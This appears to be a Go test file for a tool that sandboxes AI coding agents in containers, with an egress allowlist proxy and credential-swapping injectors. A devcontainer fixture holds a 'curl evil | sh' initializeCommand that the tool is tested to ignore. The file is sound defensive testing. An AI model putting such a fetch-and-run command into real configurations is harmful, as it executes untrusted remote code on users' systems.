package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestBoxHostAllowed(t *testing.T) {
	hosts := parseBoxAllowlist("pypi.org\n*.githubusercontent.com # comment\n\nGitHub.com\n")
	for host, want := range map[string]bool{
		"pypi.org": true, "files.pypi.org": true, "evilpypi.org": false,
		"raw.githubusercontent.com": true, "githubusercontent.com": true,
		"github.com": true, "api.github.com": true, "example.com": false, "": false,
	} {
		if got := boxHostAllowed(hosts, host); got != want {
			t.Errorf("%q: got %v, want %v", host, got, want)
		}
	}
	if !boxHostAllowed([]string{"*"}, "anything.example") {
		t.Fatal("* should allow everything")
	}
	dev := boxPresetHosts("dev")
	if !boxHostAllowed(dev, "pypi.org") || boxHostAllowed(dev, "chatgpt.com") || len(boxPresetHosts("locked")) != 0 {
		t.Fatal("dev should allow registries but no agent's hosts, and locked nothing")
	}
}

func TestBoxEgressProxy(t *testing.T) {
	dir := t.TempDir()
	allowPath := filepath.Join(dir, "allow")
	os.WriteFile(allowPath, []byte("allowed.test\n"), 0o600)
	var logged bytes.Buffer
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "upstream says hi") }))
	defer upstream.Close()
	proxy := &boxEgressProxy{
		allow: &boxAllowlist{path: allowPath},
		log:   &boxNetworkLog{file: &logged},
		dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			// Every allowed host is the test upstream.
			return net.Dial("tcp", strings.TrimPrefix(upstream.URL, "http://"))
		},
	}
	server := httptest.NewServer(proxy)
	defer server.Close()
	proxyURL, _ := url.Parse(server.URL)
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}

	response, err := client.Get("http://allowed.test/x")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(response.Body)
	response.Body.Close()
	if string(body) != "upstream says hi" {
		t.Fatalf("plain http: %q", body)
	}
	response, err = client.Get("http://blocked.test/x")
	if err != nil || response.StatusCode != http.StatusForbidden {
		t.Fatalf("blocked: %v %v", response, err)
	}

	// A CONNECT tunnel to an allowed host carries bytes both ways.
	conn, err := net.Dial("tcp", proxyURL.Host)
	if err != nil {
		t.Fatal(err)
	}
	fmt.Fprintf(conn, "CONNECT allowed.test:443 HTTP/1.1\r\nHost: allowed.test:443\r\n\r\n")
	reader := bufio.NewReader(conn)
	status, _ := reader.ReadString('\n')
	if !strings.Contains(status, "200") {
		t.Fatalf("connect: %q", status)
	}
	reader.ReadString('\n')
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: allowed.test\r\nConnection: close\r\n\r\n")
	rest, _ := io.ReadAll(reader)
	conn.Close()
	if !strings.Contains(string(rest), "upstream says hi") {
		t.Fatalf("tunnel: %q", rest)
	}

	// A new entry is picked up without a restart.
	time.Sleep(10 * time.Millisecond)
	os.WriteFile(allowPath, []byte("allowed.test\nblocked.test\n"), 0o600)
	future := time.Now().Add(time.Second)
	os.Chtimes(allowPath, future, future)
	if response, err = client.Get("http://blocked.test/x"); err != nil || response.StatusCode != http.StatusOK {
		t.Fatalf("after allow: %v %v", response, err)
	}
	for _, want := range []string{"allowed allowed.test", "blocked blocked.test"} {
		if !strings.Contains(logged.String(), want) {
			t.Errorf("log lacks %q:\n%s", want, logged.String())
		}
	}
}

func TestBoxClaudeInjector(t *testing.T) {
	var seen []string
	anthropic := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen = append(seen, r.Header.Get("Authorization")+" "+r.Header.Get("X-Api-Key"))
		io.WriteString(w, `{"ok":true}`)
	}))
	defer anthropic.Close()
	dir := t.TempDir()
	secret := filepath.Join(dir, "credentials.json")
	future := time.Now().Add(time.Hour).UnixMilli()
	os.WriteFile(secret, []byte(fmt.Sprintf(`{"claudeAiOauth":{"accessToken":"real-token","expiresAt":%d}}`, future)), 0o600)
	var logged bytes.Buffer
	injector := httptest.NewServer(newBoxClaudeInjector(secret, anthropic.URL, &boxNetworkLog{file: &logged}))
	defer injector.Close()

	request, _ := http.NewRequest(http.MethodPost, injector.URL+"/v1/messages", strings.NewReader("{}"))
	request.Header.Set("Authorization", "Bearer "+boxClaudePlacehold)
	request.Header.Set("X-Api-Key", "leaked")
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		t.Fatal(err)
	}
	response.Body.Close()
	if seen[0] != "Bearer real-token " {
		t.Fatalf("upstream saw %q", seen[0])
	}
	// A plain token file from claude setup-token works too.
	os.WriteFile(secret, []byte("sk-ant-oat01-long\n"), 0o600)
	request, _ = http.NewRequest(http.MethodPost, injector.URL+"/v1/messages", nil)
	request.Header.Set("Authorization", "Bearer "+boxClaudePlacehold)
	response, _ = http.DefaultClient.Do(request)
	response.Body.Close()
	if seen[1] != "Bearer sk-ant-oat01-long " {
		t.Fatalf("upstream saw %q", seen[1])
	}
	// An expired sign-in is logged.
	os.WriteFile(secret, []byte(`{"claudeAiOauth":{"accessToken":"old","expiresAt":1}}`), 0o600)
	if _, err := readBoxClaudeToken(secret); err == nil || !strings.Contains(err.Error(), "expired") {
		t.Fatalf("expired: %v", err)
	}
}

func TestBoxDevcontainer(t *testing.T) {
	root := t.TempDir()
	os.MkdirAll(filepath.Join(root, ".devcontainer"), 0o755)
	os.WriteFile(filepath.Join(root, ".devcontainer", "devcontainer.json"), []byte(`{
  // comments and trailing commas are allowed
  "image": "mcr.microsoft.com/devcontainers/python:3.12",
  "containerEnv": {"URL": "http://x//y", },
  "postCreateCommand": ["uv", "sync", "it's"],
  "initializeCommand": "curl evil | sh",
  "runArgs": ["--privileged"],
  /* block */
  "customizations": {"hi": {"domains": ["data.example.com"], "network": "locked", "gpu": true, "bundles": ["data"]}},
}`), 0o644)
	config, err := readBoxDevcontainer(root)
	if err != nil {
		t.Fatal(err)
	}
	if config.Image != "mcr.microsoft.com/devcontainers/python:3.12" || config.ContainerEnv["URL"] != "http://x//y" {
		t.Fatalf("config = %+v", config)
	}
	if got := strings.Join(config.ignored, ","); got != "initializeCommand,runArgs" {
		t.Fatalf("ignored = %q", got)
	}
	if config.postCreate() != `'uv' 'sync' 'it'\''s'` {
		t.Fatalf("postCreate = %q", config.postCreate())
	}
	hi := config.Customizations.Hi
	if hi.Network != "locked" || !hi.GPU || hi.Domains[0] != "data.example.com" || strings.Join(hi.Bundles, ",") != "data" {
		t.Fatalf("customizations = %+v", hi)
	}
}

func TestMergeBundleNames(t *testing.T) {
	if got := strings.Join(mergeBundleNames([]string{"data", " web"}, []string{"web", "office"}), ","); got != "data,web,office" {
		t.Fatalf("merged %q", got)
	}
	if got := mergeBundleNames(nil, nil); len(got) != 0 {
		t.Fatalf("nothing merged to %v", got)
	}
}

func TestBoxRiskyFiles(t *testing.T) {
	for path, want := range map[string]bool{
		"Makefile": true, "sub/package.json": true, ".github/workflows/ci.yml": true, ".envrc": true,
		".vscode/tasks.json": true, "src/main.py": false, "docs/Makefile.md": false, "pyproject.toml": true,
	} {
		if got := boxRiskyFiles.MatchString(path); got != want {
			t.Errorf("%s: got %v", path, got)
		}
	}
}

// TestBoxStartArguments checks the container commands for a background
// Claude box, without an engine.
func TestBoxStartArguments(t *testing.T) {
	root := t.TempDir()
	t.Setenv("XDG_STATE_HOME", filepath.Join(root, "state"))
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(root, "config"))
	t.Setenv("HOME", filepath.Join(root, "home"))
	os.MkdirAll(filepath.Join(root, "home", ".claude"), 0o700)
	os.WriteFile(filepath.Join(root, "home", ".claude", ".credentials.json"), []byte(`{"claudeAiOauth":{"accessToken":"real"}}`), 0o600)
	os.MkdirAll(filepath.Join(root, "home", ".local", "bin"), 0o755)
	os.WriteFile(filepath.Join(root, "home", ".local", "bin", "claude"), []byte("#!/bin/sh\n"), 0o755)
	project := filepath.Join(root, "project")
	os.MkdirAll(project, 0o755)
	for _, args := range [][]string{{"init", "-q"}, {"-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"}} {
		if out, err := exec.Command("git", append([]string{"-C", project}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git: %s", out)
		}
	}
	t.Chdir(project)

	var calls [][]string
	previousCommand, previousLook := boxCommand, boxLookPath
	boxCommand = func(stdin io.Reader, stdout, stderr io.Writer, name string, args ...string) error {
		if name == "git" {
			return previousCommand(stdin, stdout, stderr, name, args...)
		}
		calls = append(calls, args)
		if len(args) > 1 && args[1] == "inspect" && args[0] == "image" {
			return nil // the base image exists
		}
		if len(args) > 1 && args[0] == "container" && args[1] == "inspect" {
			return fmt.Errorf("no such container")
		}
		return nil
	}
	boxLookPath = func(name string) (string, error) {
		if name == "podman" {
			return "/usr/bin/podman", nil
		}
		return "", exec.ErrNotFound
	}
	defer func() { boxCommand, boxLookPath = previousCommand, previousLook }()

	var stdout, stderr bytes.Buffer
	if status := runAgent([]string{"claude", "--detach", "--name", "t1", "fix", "it"}, strings.NewReader(""), &stdout, &stderr); status != 0 {
		t.Fatalf("status %d: %s %s", status, stdout.String(), stderr.String())
	}
	var run, proxy []string
	for _, call := range calls {
		switch {
		case call[0] == "run":
			run = call
		case call[0] == "create":
			proxy = call
		}
	}
	joined := strings.Join(run, " ")
	for _, want := range []string{
		"--network hi-box-t1", "--dns 127.0.0.1", "-d", "--userns=keep-id", "--cap-drop=ALL", "no-new-privileges",
		"CLAUDE_CODE_OAUTH_TOKEN=" + boxClaudePlacehold, "ANTHROPIC_BASE_URL=http://10.234.", ":3129",
		"/.git/hooks:", "/.git/hooks:ro", "/.git/config:ro",
		"claude -p --output-format json --dangerously-skip-permissions --model opus < /box/home/.hi-agent/task.md > /box/home/.hi-agent/result.json",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("box run lacks %q:\n%s", want, joined)
		}
	}
	// The task goes on stdin from a file in the box's home, not on the
	// command line.
	if task, _ := os.ReadFile(boxStateFile("t1", "home", agentResultDir, "task.md")); !strings.HasPrefix(string(task), "fix it\n\nWhen you are finished") ||
		!strings.Contains(string(task), "<<<REPORT") || strings.Contains(joined, "fix it") {
		t.Errorf("task file %q; run %s", task, joined)
	}
	if strings.Contains(joined, ".credentials.json") || strings.Contains(joined, "/home/.ssh") {
		t.Fatalf("credentials reach the box:\n%s", joined)
	}
	if !strings.Contains(strings.Join(proxy, " "), ".credentials.json:/secrets/claude:ro") {
		t.Fatalf("proxy lacks the token:\n%v", proxy)
	}
	meta, err := loadBoxMeta("t1")
	if err != nil || !meta.Worktree || meta.Branch != "hi-box/t1" || !meta.Background {
		t.Fatalf("meta = %+v, %v", meta, err)
	}
	if _, err := os.Stat(filepath.Join(meta.Workdir, ".git")); err != nil {
		t.Fatalf("no worktree: %v", err)
	}

	// rm removes the worktree, and the branch since nothing was committed.
	stdout.Reset()
	if status := runBox([]string{"rm", "t1"}, strings.NewReader(""), &stdout, &stderr); status != 0 {
		t.Fatalf("rm: %s", stderr.String())
	}
	if fileExists(meta.Workdir) || boxGit(project, "rev-parse", "--verify", "-q", "hi-box/t1") != "" {
		t.Fatalf("rm left the worktree or branch: %s", stdout.String())
	}
}

func TestBoxRefusesTheHomeFolder(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Chdir(home)
	previous := boxLookPath
	boxLookPath = func(string) (string, error) { return "/usr/bin/podman", nil }
	defer func() { boxLookPath = previous }()
	var stdout, stderr bytes.Buffer
	if status := runBox([]string{"shell"}, strings.NewReader(""), &stdout, &stderr); status == 0 || !strings.Contains(stderr.String(), "not in") {
		t.Fatalf("status %d: %s", status, stderr.String())
	}
}

func TestBoxRemoveAll(t *testing.T) {
	root := t.TempDir()
	t.Setenv("XDG_STATE_HOME", filepath.Join(root, "state"))
	project := filepath.Join(root, "project")
	os.MkdirAll(project, 0o755)
	git := func(dir string, args ...string) {
		if out, err := exec.Command("git", append([]string{"-C", dir, "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %s", args, out)
		}
	}
	git(project, "init", "-q")
	git(project, "commit", "-q", "--allow-empty", "-m", "init")
	base := boxGit(project, "rev-parse", "HEAD")
	// Three boxes: clean, with a commit, and with uncommitted work.
	for _, name := range []string{"clean", "committed", "dirty"} {
		work := boxStateFile(name, "work")
		os.MkdirAll(filepath.Dir(work), 0o700)
		git(project, "worktree", "add", "-q", "-b", "hi-box/"+name, work, "HEAD")
		saveBoxMeta(boxMeta{Name: name, Agent: "claude", Root: project, Workdir: work, Worktree: true, Branch: "hi-box/" + name, Base: base, Engine: "podman"})
	}
	os.WriteFile(filepath.Join(boxStateFile("committed", "work"), "f"), []byte("x"), 0o644)
	git(boxStateFile("committed", "work"), "add", "f")
	git(boxStateFile("committed", "work"), "commit", "-q", "-m", "work")
	os.WriteFile(filepath.Join(boxStateFile("dirty", "work"), "g"), []byte("x"), 0o644)

	previousCommand, previousLook := boxCommand, boxLookPath
	boxCommand = func(stdin io.Reader, stdout, stderr io.Writer, name string, args ...string) error {
		if name == "git" {
			return previousCommand(stdin, stdout, stderr, name, args...)
		}
		return nil
	}
	boxLookPath = func(string) (string, error) { return "/usr/bin/podman", nil }
	defer func() { boxCommand, boxLookPath = previousCommand, previousLook }()

	// Without a terminal or --yes, nothing goes.
	var stdout, stderr bytes.Buffer
	if status := runBox([]string{"rm", "--all"}, strings.NewReader(""), &stdout, &stderr); status == 0 || !strings.Contains(stderr.String(), "--yes") {
		t.Fatalf("status %d: %s", status, stderr.String())
	}
	stdout.Reset()
	if status := runBox([]string{"rm", "--all", "--yes"}, strings.NewReader(""), &stdout, &stderr); status != 0 {
		t.Fatalf("status %d: %s", status, stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "dirty (claude, hi-box/dirty)   kept: uncommitted work") || !strings.Contains(out, "Its branch hi-box/committed is kept") {
		t.Fatalf("output:\n%s", out)
	}
	if fileExists(boxStateFile("clean")) || fileExists(boxStateFile("committed")) || !fileExists(boxStateFile("dirty", "work", "g")) {
		t.Fatal("wrong boxes removed")
	}
	if boxGit(project, "rev-parse", "--verify", "-q", "hi-box/clean") != "" || boxGit(project, "rev-parse", "--verify", "-q", "hi-box/committed") == "" {
		t.Fatal("branches: the empty one should go, the one with a commit stay")
	}
	// --force removes the dirty one too.
	stdout.Reset()
	runBox([]string{"rm", "--all", "--yes", "--force"}, strings.NewReader(""), &stdout, &stderr)
	if fileExists(boxStateFile("dirty")) {
		t.Fatalf("--force kept the dirty box:\n%s", stdout.String())
	}
}

func TestBoxDataInjectorSwapsTheToken(t *testing.T) {
	var seen []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen = append(seen, r.URL.EscapedPath()+" "+r.Header.Get("Authorization"))
		base := "http://" + r.Host + "/hf"
		w.Header().Set("Location", base+"/api/resolve-cache/models/o/n/abc/onnx%2Fconfig.json")
		w.Header().Set("Link", "<"+base+"/api/models/o/n/xet-read-token/abc>; rel=\"xet-auth\"")
		w.WriteHeader(http.StatusTemporaryRedirect)
	}))
	defer upstream.Close()
	tokenFile := filepath.Join(t.TempDir(), "token")
	writeTestFile(t, tokenFile, "hidata_real\n", 0o600)
	var logged strings.Builder
	injector := httptest.NewServer(newBoxDataInjector(tokenFile, upstream.URL+"/hf", &boxNetworkLog{file: &logged}))
	defer injector.Close()

	request, _ := http.NewRequest(http.MethodHead, injector.URL+"/o/n/resolve/main/onnx%2Fconfig.json", nil)
	request.Header.Set("Authorization", "Bearer "+boxClaudePlacehold)
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	response, err := client.Do(request)
	if err != nil {
		t.Fatal(err)
	}
	response.Body.Close()
	if len(seen) != 1 || seen[0] != "/hf/o/n/resolve/main/onnx%2Fconfig.json Bearer hidata_real" {
		t.Fatalf("the server saw %q", seen)
	}
	if location := response.Header.Get("Location"); location != injector.URL+"/api/resolve-cache/models/o/n/abc/onnx%2Fconfig.json" {
		t.Fatalf("Location = %q", location)
	}
	if link := response.Header.Get("Link"); !strings.Contains(link, "<"+injector.URL+"/api/models/o/n/xet-read-token/abc>") {
		t.Fatalf("Link = %q", link)
	}
	if !strings.Contains(logged.String(), "data") {
		t.Fatalf("not logged: %s", logged.String())
	}
}

func TestBoxDataOption(t *testing.T) {
	options, err := parseBoxOptions("shell", []string{"--data"})
	if err != nil || !options.data {
		t.Fatalf("--data: %+v, %v", options, err)
	}
	if !boxHostAllowed(boxDataHosts, "us.aws.cdn.hf.co") || !boxHostAllowed(boxDataHosts, "cas-server.xethub.hf.co") || boxHostAllowed(boxDataHosts, "huggingface.co") {
		t.Fatal("the data hosts should cover the CDN and Xet storage only")
	}
}
